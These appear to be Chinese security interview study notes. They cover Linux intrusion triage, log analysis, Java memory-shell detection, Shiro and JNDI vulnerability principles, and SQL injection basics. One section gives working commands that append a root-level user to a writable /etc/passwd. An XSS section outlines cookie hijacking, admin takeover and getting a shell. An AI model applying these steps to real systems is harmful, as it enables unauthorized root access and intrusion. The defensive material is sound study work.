<p><code>影子文件</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/etc/shadow</span><br><span class="line">root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV</span><br><span class="line">9ajBwUt1DpYxTCVvI/:16809:0:99999:7:::</span><br><span class="line">用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之</span><br><span class="line">后的宽限天数：账号失效时间：保留</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">who			查看当前登陆用户</span><br><span class="line">w			查看系统信息,想知道某一时刻用户的行为</span><br><span class="line">uptime		查看登陆多久,多少用户,负载</span><br></pre></td></tr></table></figure>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230413191405619.png" alt="image-20230413191405619"></p>
<h5 id="入侵排查">入侵排查</h5>
<p><code>查看特权用户</code><strong>(uid为0)</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk -F: &#x27;$3==0&#123;print $1&#125;&#x27; /etc/passwd</span><br></pre></td></tr></table></figure>
<p><code>查看可以远程登陆的账户信息</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow</span><br></pre></td></tr></table></figure>
<p><code>除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</span><br></pre></td></tr></table></figure>
<p><code>禁用或删除多余以及可以的账户</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">usermod -L username 禁用帐号，帐号无法登录/etc/shadow第二栏为!开头</span><br><span class="line">userdel username 删除用户</span><br><span class="line">userdel -r username 将删除该用户,并且将/home下的user目录一并删除</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="历史命令">历史命令</h4>
<h5 id="通过-bash-history查看帐号执行过的系统命令">通过.bash_history查看帐号执行过的系统命令</h5>
<p>如果想要执行历史命令中的某个命令直接感叹号</p>
<p><code>root的历史命令</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">history</span><br></pre></td></tr></table></figure>
<p><code>查看某用户的操作历史</code></p>
<pre><code>cat  /home/username/.bash_history
</code></pre>
<p>在<code>/etc/profile</code>的文件尾部添加如下行数配置信息，可以显示登录的IP地址、执行命令时间等信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">USER_IP=`who -u am i 2&gt;/dev/null | awk &#x27;&#123;print $NF&#125;&#x27; | sed -e &#x27;s/[()]//g&#x27;`</span><br><span class="line">if [ &quot;$USER_IP&quot; = &quot;&quot; ]</span><br><span class="line">then</span><br><span class="line">USER_IP=`hostname`</span><br><span class="line">fi</span><br><span class="line">export HISTTIMEFORMAT=&quot;%F %T $USER_IP `whoami` &quot;</span><br><span class="line">shopt -s histappend</span><br><span class="line">export PROMPT_COMMAND=&quot;history -a&quot;</span><br></pre></td></tr></table></figure>
<h4 id="检查异常端口">检查异常端口</h4>
<p>使用netstat网络连接命令,分析可疑端口,IP,PID</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">netstat -antlp|more</span><br><span class="line"></span><br><span class="line">查看pid所对应的进程文件路径</span><br><span class="line">运行ls -l /proc/PID/exe 或file /proc/PID/exe (PID为对应的pid号)</span><br></pre></td></tr></table></figure>
<h4 id="检查异常进程">检查异常进程</h4>
<p>使用ps命令,分析进程</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep pid</span><br></pre></td></tr></table></figure>
<h4 id="检查开机启动项">检查开机启动项</h4>
<p><code>查看启动配置文件</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -l /etc/rc*.d/</span><br><span class="line">ls -l /etc/rc.d/rc[0~6].d</span><br></pre></td></tr></table></figure>
<p><code>查看运行级别命令</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runlevel</span><br></pre></td></tr></table></figure>
<p>当我们需要开机启动自己的脚本时，只需要将可执行脚本丢在/etc/init.d目录下，然后在/etc/rc.d/rc*.d中建立软链 接即可 root@localhost ~]# ln -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh 此处sshd是具体服务的脚本文件，S100ssh是其软链接，S开头代表加载时自启动；如果是K开头的脚本文件，代表运行 级别加载时需要关闭的。</p>
<h4 id="检查定时任务">检查定时任务</h4>
<p>利用crontab创建计划任务</p>
<h5 id="基本命令">基本命令</h5>
<p>crontab -l 列出某个用户cron服务的详细内容</p>
<p>Tips：默认编写的crontab文件会保存在 (/var/spool/cron/用户名 例如: /var/spool/cron/root</p>
<p>crontab -r 删除每个用户cront任务(谨慎：删除所有的计划任务)</p>
<p>crontab -e 使用编辑器编辑当前的crontab文件</p>
<h5 id="入侵排查-2">入侵排查</h5>
<p>重点关注一下目录中是否存在恶意脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/var/spool/cron/*</span><br><span class="line">/etc/crontab</span><br><span class="line">/etc/cron.d/*</span><br><span class="line">/etc/cron.daily/*</span><br><span class="line">/etc/cron.hourly/*</span><br><span class="line">/etc/cron.monthly/*</span><br><span class="line">/etc/cron.weekly/</span><br><span class="line">/etc/anacrontab</span><br><span class="line">/var/spool/anacron/*</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><em><em>小技巧： more /etc/cron.daily/</em> 查看目录下所有文件</em>*</p>
<h4 id="检查服务">检查服务</h4>
<h5 id="入侵排查-3">入侵排查</h5>
<p>查询已安装的服务：</p>
<p>RPM包安装的服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">chkconfig --list 查看服务自启动状态，可以看到所有的RPM包安装的服务</span><br><span class="line">ps aux | grep crond 查看当前服务</span><br><span class="line">系统在3与5级别下的启动项</span><br><span class="line">中文环境</span><br><span class="line">chkconfig --list | grep &quot;3:启用\|5:启用&quot;</span><br><span class="line">英文环境</span><br><span class="line">chkconfig --list | grep &quot;3:on\|5:on&quot;</span><br></pre></td></tr></table></figure>
<p><strong>源码包安装的服务</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查看服务安装位置 ，一般是在/user/local/</span><br><span class="line">service httpd start</span><br><span class="line">搜索/etc/rc.d/init.d/ 查看是否存在</span><br></pre></td></tr></table></figure>
<h5 id="服务器自启动">服务器自启动</h5>
<p>第一种修改方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chkconfig [--level 运行级别] [独立服务名] [on|off]</span><br><span class="line">chkconfig –level 2345 httpd on 开启自启动</span><br><span class="line">chkconfig httpd on （默认level是2345）</span><br></pre></td></tr></table></figure>
<p>第二种修改方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">修改 /etc/re.d/rc.local 文件</span><br><span class="line">加入 /etc/init.d/httpd start</span><br></pre></td></tr></table></figure>
<p>第三种修改方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用ntsysv命令管理自启动，可以管理独立服务和xinetd服务</span><br></pre></td></tr></table></figure>
<h4 id="检查异常文件">检查异常文件</h4>
<p>查看敏感目录，如/tmp目录下的文件，同时注意隐藏文件夹，以“…”为名的文件夹具有隐藏属性</p>
<p>如<code>.test.txt</code>前面带<code>.</code>的文件是隐藏文件</p>
<p>得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？</p>
<p>可以使用find命令来查找，如 find /opt -iname “*” -atime 1 -type f 找出 /opt 下一天前访问过的文件</p>
<p>针对可疑文件可以使用stat进行创建修改时间</p>
<h4 id="检查系统日志">检查系统日志</h4>
<p>日志默认存放位置：/var/log/</p>
<p>查看日志配置情况：more /etc/rsyslog.conf</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">定位有多少IP在爆破主机的root帐号：</span><br><span class="line">grep &quot;Failed password for root&quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr</span><br><span class="line">| more</span><br><span class="line">定位有哪些IP在爆破：</span><br><span class="line">grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4]</span><br><span class="line">[0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</span><br><span class="line"></span><br><span class="line">爆破用户名字典是什么？</span><br><span class="line">grep &quot;Failed password&quot; /var/log/secure|perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print</span><br><span class="line">&quot;$1\n&quot;;&#125;&#x27;|uniq -c|sort -nr</span><br><span class="line"></span><br><span class="line">登录成功的IP有哪些：</span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">登录成功的日期、用户名、IP：</span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27;</span><br><span class="line"></span><br><span class="line">增加一个用户kali日志：</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001,</span><br><span class="line">home=/home/kali</span><br><span class="line">, shell=/bin/bash</span><br><span class="line">Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali</span><br><span class="line">#grep &quot;useradd&quot; /var/log/secure</span><br><span class="line"></span><br><span class="line">删除用户kali日志：</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: delete user &#x27;kali&#x27;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed group &#x27;kali&#x27; owned by &#x27;kali&#x27;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed shadow group &#x27;kali&#x27; owned by &#x27;kali&#x27;</span><br><span class="line"># grep &quot;userdel&quot; /var/log/secure</span><br><span class="line"></span><br><span class="line">su切换用户：</span><br><span class="line">Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by</span><br><span class="line">root(uid=0)</span><br><span class="line"></span><br><span class="line">sudo授权执行:</span><br><span class="line">sudo -l</span><br><span class="line">Jul 10 00:43:09 localhost sudo: good : TTY=pts/4 ; PWD=/home/good ; USER=root ;</span><br><span class="line">COMMAND=/sbin/shutdown -r now</span><br></pre></td></tr></table></figure>
<h4 id="检查异常文件-找-php后缀文件">检查异常文件,找.php后缀文件</h4>
<p>查看敏感目录，如/tmp目录下的文件，同时注意隐藏文件夹，以“…”为名的文件夹具有隐藏属性 2、得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？ 可以使用find命令来查找，如 find /opt -iname “*” -atime 1 -type f 找出 /opt 下一天前访问过的文件 3、针对可疑文件可以使用stat进行创建修改时间。</p>
<h4 id="检查系统日志-2">检查系统日志</h4>
<p>日志默认存放位置：/var/log/</p>
<p>查看日志配置情况：more /etc/rsyslog.conf</p>
<table>
<thead>
<tr>
<th>日志文件</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>/var/log/cron</td>
<td>记录了系统定时相关的日志</td>
</tr>
<tr>
<td>/var/log/cups</td>
<td>记录打印信息的日志</td>
</tr>
<tr>
<td>/var/log/dmesg</td>
<td>记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息</td>
</tr>
<tr>
<td>/var/log/mailog</td>
<td>记录邮件信息</td>
</tr>
<tr>
<td><strong>/var/log/message</strong></td>
<td>记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系 统出现问题时，首先要检查的就应该是这个日志文件</td>
</tr>
<tr>
<td>/var/log/btmp</td>
<td>记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看</td>
</tr>
<tr>
<td>/var/log/lastlog</td>
<td>记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要 使用lastlog命令查看</td>
</tr>
<tr>
<td>/var/log/wtmp</td>
<td>永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文 件也是一个二进制文件，不能直接vi，而需要使用last命令来查看</td>
</tr>
<tr>
<td>/var/log/utmp</td>
<td>记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登 录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询</td>
</tr>
<tr>
<td>/var/log/secure</td>
<td>记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换 用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</td>
</tr>
</tbody>
</table>
<h2 id="网络空间搜索引擎用过吗">网络空间搜索引擎用过吗</h2>
<h3 id="FOFA">FOFA</h3>
<p>官网：<a target="_blank" rel="noopener" href="https://fofa.info/">https://fofa.info/</a></p>
<p>FOFA是白帽汇推出的一款网络空间搜索引擎，它通过进行网络空间测绘，能够帮助研究人员或者企业迅速进行网络资产匹配，例如进行漏洞影响范围分析、应用分布统计、应用流行度排名统计等.</p>
<table>
<thead>
<tr>
<th>逻辑连接符</th>
<th>具体含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>=</td>
<td>匹配，=&quot;&quot;时，可查询不存在字段或者值为空的情况。</td>
</tr>
<tr>
<td>==</td>
<td>完全匹配，==&quot;&quot;时，可查询存在且值为空的情况。</td>
</tr>
<tr>
<td>&amp;&amp;</td>
<td>与</td>
</tr>
<tr>
<td>||</td>
<td>或者</td>
</tr>
<tr>
<td>!=</td>
<td>不匹配，!=&quot;&quot;时，可查询值为空的情况。</td>
</tr>
<tr>
<td>*=</td>
<td>模糊匹配，使用<em>或者?进行搜索，比如banner</em>=“mys??” (个人版及以上可用)。</td>
</tr>
<tr>
<td>()</td>
<td>确认查询优先级，括号内容优先级最高。</td>
</tr>
</tbody>
</table>
<h2 id="怎么用渗透工具配合xss攻击获取服务器权限">怎么用渗透工具配合xss攻击获取服务器权限</h2>
<p>获取到管理员的一些信息</p>
<p>访问之后通过chrome上的EditThisCookie插件替换cookie成功以管理员的身份进入后台</p>
<p>利用<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/8aa9474a148c">浏览器的同源策略</a></p>
<p>同源的定义：如果两个页面的协议，端口和主机都相同，则两个页面具有相同的源。Cookie：只有同源的网页才能共享，但是若两个页面一级域名相同，只是二级域名不同，那么浏览器可以通过设置document.domain来共享Cookie。</p>
<p>通过同源策略，我们成功的进入了管理员的后台。<br>
进入后台第一件事：找上传点！</p>
<p>看看自己是什么权限</p>
<p>试一下能不能弹shell到msf</p>
<p>看看有没有域环境,尝试横向渗透</p>
<h3 id="挖矿">挖矿</h3>
<p>隔离主机、排查（top资源占用、开机启动、任务计划、端口开放）、清除</p>
<h3 id="内网">内网</h3>
<p><strong>内网横移</strong>：IPC、WMI、SMB、msf密码喷射、PTP（ms14-068）</p>
<p><strong>内网报警</strong>：定位报警&gt;打补丁&gt;木马查杀&gt;分析流量&gt;微补查询&gt; whois&gt;社工</p>
<h3 id="JNDI注入">JNDI注入</h3>
<p><strong>原理:</strong></p>
<p>当应用进行JNDI查询的时候，若查询的URL可以由攻击者控制，则攻击者可以使服务器去查询恶意的链接使得服务器加载一些恶意Class，实现任意代码执行。</p>
<p><strong>防护建议</strong></p>
<ul>
<li>若该漏洞源于第三方组件，请及时进行组件版本升级。</li>
<li>若为自写JNDI查询代码，请对查询的URL进行限制，禁止一些危险协议的查询。</li>
</ul>
<h3 id="JNI注入">JNI注入</h3>
<p><strong>原理:</strong></p>
<p>JNI注入是一种通用的RASP（Runtime Application Self-Protection）绕过手段。当攻击者拿到代码执行权限后，可以通过Java Native函数去调用外部的恶意动态链接库，从而绕过Java层的安全防护，并隐匿具体的恶意行为。</p>
<p><strong>防护建议:</strong></p>
<p>服务器可能存在代码执行漏洞，检查漏洞的位置并限制执行代码的功能。</p>
<h3 id="JSTL任意文件包含">JSTL任意文件包含</h3>
<p><strong>原理:</strong></p>
<p>JSP标准标签库（JSTL）是一个JSP标签集合，它封装了JSP应用的通用核心功能。当用户可控参数被直接拼接到JSTL标签中而未对该参数进行任何限制的情况下，攻击者可以构造特殊的攻击脚本造成任意文件读取、SSRF的攻击。</p>
<p><strong>防护建议:</strong></p>
<p>尽可能不要将用户可控参数直接拼接到JSTL标签上，如果必须这样做，请对该参数的内容进行严格的白名单控制。</p>
<h3 id="shiro">shiro</h3>
<p>关键字rememberMe=deleteMe</p>
<p>利用：出网&gt;反弹、不出网&gt;写shell</p>
<p><strong>原理</strong>：用户登陆成功后会生成经过加密并编码的cookie，在服务端接收cookie值后，Base64解码–&gt;AES解密–&gt;反序列化。攻击者只要找到AES加密的密钥，就可以构造一个恶意对象，对其进行序列化–&gt;AES加密–&gt;Base64编码，然后将其作为cookie的rememberMe字段发送，Shiro将rememberMe进行解密并且反序列化，最终造成反序列化漏洞</p>
<p><strong>550</strong>：Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。</p>
<p>在 Apache Shiro&lt;=1.2.4 版本中 AES 加密时采用的 key 是硬编码在代码中</p>
<p><strong>721</strong>：由于Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。</p>
<p>相较于550而言，它不需要知道key的值，但是它需要一个合法用户的rememberMe cookie</p>
<p>**出网协议：**jndi、ldap、rmi、JRMP、JMX、JMS</p>
<h2 id="获得了etc-passwd文件之后如何利用">获得了etc/passwd文件之后如何利用</h2>
<p>当我们可以写入etc/passwd文件,利用 /etc/passwd 文件的可写入权限，导致我们写入一个其他用户进去。</p>
<p>我们现在要做的就是自己构造一个用户，在密码占位符处指定密码，并且UID设置为0，将其添加到 /etc/passwd 文件中。</p>
<p>首先，使用perl语言生成带有盐值的密码：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -le <span class="string">&#x27;print crypt(&quot;password@123&quot;,&quot;addedsalt&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/20190820185556404.png" alt="img"></p>
<p>然后执行下面这条命令，成功将test用户的信息加入 /etc/passwd 文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;test:advwtv/9yU5yQ:0:0:User_like_root:/root:/bin/bash&quot;</span> &gt;&gt;/etc/passwd</span><br></pre></td></tr></table></figure>
<p>以用户名：test 密码： password@123 登录主机，登录成功后，是 root 权限。</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/20190820205147934.png" alt="img"></p>
<h2 id=""></h2>
<h2 id="java内存马查杀">java内存马查杀</h2>
<p>内存马是无文件落地webshell中最常见的攻击手段，随着攻防演练对抗强度越来越高，流量分析、EDR等专业安全设备被蓝方广泛使用，传统的文件上传的webshll以及文件形式的后门容易被检测到，文件shell明显气数已尽，而内存马因其隐蔽性等优点从而越来越盛行。</p>
<p>由客户端发起的Web请求后，中间件的各个独立的组件如Listener、Filter、Servlet等组件会在请求过程中做监听、判断、过滤等操作，内存马就是利用请求过程在内存中修改已有的组件或动态注册一个新的组件，插入恶意的shellcode，达到持久化控制服务器的目的。内存马可以通过访问存在漏洞的url加上命令执行参数，即可让服务器返回结果也可通过webshell管理工具例如：蚁剑、冰蝎、哥斯拉等进行远程连接后攻击目标。</p>
<p>内存马在语言类型上有PHP内存马，Python内存马，而本文主要侧重于“市场占有率”最高的java内存马的检测与查杀，java内存马又主要分为下面这</p>
<h3 id="内存马特征的识别">内存马特征的识别</h3>
<p>依然是以filter内存马举例</p>
<h4 id="filter特殊名称">filter特殊名称</h4>
<p>内存马的Filter名一般比较特别，随便一点的可能有shell，Mem这种关键词或者随机数随机字母。当然这个特征并不是决定条件，因为讲究一点的攻击者也可以将filter伪装成web应用自带的名称。</p>
<h4 id="filter优先级">filter优先级</h4>
<p>为了确保内存马在各种环境下都可以访问，往往需要把filter匹配优先级调至最高，比如shiro反序列化漏洞。</p>
<h4 id="web-xml中没有filter配置">web.xml中没有filter配置</h4>
<p>内存马的Filter是动态注册的，所以在web.xml中肯定没有配置，如果发现了在web.xml中不存在的filter，那么这个filter就十分可疑了</p>
<h4 id="特殊classloader加载">特殊classloader加载</h4>
<p>一般来说，正常的Filter都是由中间件的WebappClassLoader加载的。而攻击者利用的getshell攻击链往往具有明显的特征，比如反序列化漏洞喜欢利用TemplatesImpl和bcel执行任意代码。所以这些class往往就是以下这两个：</p>
<p>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader</p>
<p>com.sun.org.apache.bcel.internal.util.ClassLoader</p>
<p>对应的classloader路径下没有class文件<br>
所谓内存马就是代码驻留内存中，本地无对应的class文件。所以我们只要检测Filter对应的ClassLoader目录下是否存在class文件。(这也是很多内存马检测脚步实现的原理)</p>
<h4 id="Filter的doFilter方法中有恶意代码">Filter的doFilter方法中有恶意代码</h4>
<p>我们可以把内存中所有的Filter的class dump出来，使用反编译工具分析看看，是否存在恶意代码，比如调用了：java.lang.Runtime.getRuntime，defineClass，invoke</p>
<h3 id="三大类">三大类</h3>
<ul>
<li>servlet-api类
<ul>
<li>filter型</li>
<li>servlet型</li>
<li>listener型</li>
</ul>
</li>
<li>spring类
<ul>
<li>拦截器</li>
<li>controller型</li>
</ul>
</li>
<li>Java Instrumentation类
<ul>
<li>agent型</li>
</ul>
</li>
</ul>
<h3 id="原理简述">原理简述</h3>
<h4 id="servlet-api类">servlet-api类</h4>
<p>以filter内存马为例</p>
<p>Tomcat Filter工作流程：</p>
<p>这类内存马会先创建了一个恶意的servlet，然后获取当前的StandardContext，将恶意servlet封装成wrapper添加到StandardContext的children当中，最后添加ServletMapping将访问的URL和wrapper进行绑定。执行上述代码后，访问当前应用的特定url路径，加上特定的参数就可以命令执行了。</p>
<h2 id="对边缘业务小程序渗透过吗">对边缘业务小程序渗透过吗</h2>
<p>没有</p>
<h2 id="对镜像劫持的了解">对镜像劫持的了解</h2>
<p>“映像文件执行参数”</p>
<p>表现为常见的杀毒软件、防火墙、安全检测工具等均提示“找不到文件”或执行了没有反应</p>
<p>改名可以正常使用</p>
<h1>蓝队初级面试</h1>
<h2 id="TOP10">TOP10</h2>
<p>失效的控制访问</p>
<p>加密机制失效</p>
<p>注入</p>
<p>不安全设计</p>
<p>安全配置错误</p>
<p>易受攻击和过时的组件</p>
<p>身份识别和身份验证错误</p>
<p>软件和数据完整性故障</p>
<p><strong>安全日志和监控故障</strong></p>
<p>服务器端请求伪造</p>
<h2 id="01-当你发现这个网站有CDN的时候应该怎么办">01.当你发现这个网站有CDN的时候应该怎么办?</h2>
<blockquote>
<p>CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。来自百度百科。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&gt;先观察网站是否有邮功能,比如注册的时候需要邮箱验证码，通过邮箱我们可以收集到其网站真实IP。</span><br><span class="line">2&gt;国外访问,很多CDN知识针对国内,在国外并没有部署,即使在国外部署,也不可能部署的那么全，直接搞个毛里求斯什么的可以得到。</span><br><span class="line">3&gt;查询域名解析记录,可能一开始公司做的比较小，没有CDN，后期才有了CDN,最开始的就是它的真实IP。</span><br><span class="line">4&gt;查询分站IP，大多数分站不会做CDN。</span><br></pre></td></tr></table></figure>
<h2 id="02-对哪些语言比较了解？">02.对哪些语言比较了解？</h2>
<p>前端的话对HTML,JAVA比较了解,后端对php比较了解</p>
<h2 id="03-sql注入需要满足什么条件？">03.sql注入需要满足什么条件？</h2>
<p>​    <strong>SQL注入原理：</strong></p>
<blockquote>
<p><strong>通过某种方式将恶意的sql代码添加到输入参数中，然后传递到sql服务器使其解析并执行的一种攻击手法</strong></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&gt;参数用户可控：前端传给后端的参数内容是用户可以控制的.</span><br><span class="line">2&gt;参数带入数据库查询：传入的参数直接拼接到SQL语句，且带入数据库查询.</span><br><span class="line">3&gt;数据库版本5.0以上（一般回答前两个就可以了，但是个人认为也应该把这条加上去，这样就比较严谨）</span><br></pre></td></tr></table></figure>
<h2 id="04-sql注入有哪几种类型？">04.sql注入有哪几种类型？</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1&gt;union联合注入</span><br><span class="line">2&gt;报错注入</span><br><span class="line">3&gt;堆叠注入</span><br><span class="line">4&gt;宽字节注入</span><br><span class="line">5&gt;XXF</span><br><span class="line">6&gt;Cookie</span><br><span class="line">7&gt;UA</span><br><span class="line">8&gt;万能密码</span><br><span class="line">9&gt;布尔盲注	(异或注入)</span><br><span class="line">10&gt;时间盲注 sleep() benchmark() 笛卡尔积 get_lock()加锁 rlike regexp正则匹配</span><br><span class="line">get_lock():限制条件就是数据库的连接必须是持久连接</span><br><span class="line">11&gt;二次注入</span><br><span class="line">12&gt;文件读写 load_file() into outfile</span><br></pre></td></tr></table></figure>
<h2 id="05-简单讲一下防范SQL注入的方法和原理">05.简单讲一下防范SQL注入的方法和原理</h2>
